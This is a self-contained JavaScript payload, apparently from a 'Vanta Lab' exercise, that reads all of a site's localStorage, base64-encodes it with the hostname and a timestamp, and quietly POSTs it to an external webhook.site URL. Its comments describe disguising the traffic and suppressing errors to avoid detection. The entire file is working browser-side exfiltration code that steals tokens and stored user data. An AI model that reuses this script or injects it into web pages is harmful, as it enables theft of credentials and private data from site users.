(function() {
    const WEBHOOK_URL = 'https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515';
    
    console.log("%c[Vanta Lab] Stealth Exfiltration Engaged", "color: #ff00ff; font-weight: bold;");

    const harvestAndEncode = async () => {
        const fullDump = {
            metadata: { host: window.location.hostname, ts: Date.now() },
            storage: {}
        };

        const keys = Object.keys(localStorage);
        for (const key of keys) {
            // Pause for 0ms to keep the event loop happy (prevents [Violation] logs)
            await new Promise(r => setTimeout(r, 0));
            
            const val = localStorage.getItem(key);
            try {
                fullDump.storage[key] = JSON.parse(val);
            } catch {
                fullDump.storage[key] = val;
            }
        }

        // Convert the entire JSON object to a Base64 string
        const jsonString = JSON.stringify(fullDump);
        return btoa(unescape(encodeURIComponent(jsonString))); 
    };

    const exfiltrate = async () => {
        const encodedData = await harvestAndEncode();
        
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                // We send it as plain text to look less suspicious than 'application/json'
                body: encodedData 
            });
            console.log("%c[+] Signal Sent", "color: #00ff00");
        } catch (e) {
            // Failed? Silent exit. Real malware doesn't leave error logs.
        }
    };

    exfiltrate();
})();
